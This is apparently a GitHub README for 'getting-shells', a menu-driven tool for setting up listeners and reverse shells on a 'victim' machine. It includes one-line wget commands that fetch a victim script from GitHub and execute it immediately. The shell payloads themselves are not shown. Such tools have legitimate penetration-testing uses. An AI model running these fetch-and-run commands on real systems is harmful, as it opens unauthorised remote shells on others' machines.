# getting-shells

Version 1
2021-11-23

## Purpose

Automation tool for listening and starting shells sessions.\
Both, the listener and the victim scripts check for already installed applications.\
This tool makes it very easy to try many ways lots of ways to get a shell by selecting numbers from a menu.

## Quick Execution

Listener:

```
wget -q "https://raw.githubusercontent.com/davift/getting-shells/main/listener.sh" && chmod +x listener.sh && ./listener.sh
```

![listener_screenshot](https://github.com/davift/getting-shells/blob/main/listener.png)

Victim:

```
wget -q "https://raw.githubusercontent.com/davift/getting-shells/main/victim.sh" && chmod +x victim.sh && ./victim.sh
```

![victim_screenshot](https://github.com/davift/getting-shells/blob/main/victim.png)

## Installation

No installation is required. This scripts can run out of the box. Just clone the repo:

```
git clone https://github.com/davift/getting-shells.git
```

## Execution

```

```

## Additionals

There is no such thing as dependencies to run this tool because it uses the available resources in the system to establish the connections.\
Additionally, the following script will help on installing more resources that will allow exploring all the functionalities of this tool:

```
./additionals.sh
```
## More Information

Read more at https://blog.dftorres.ca/?p=2224.
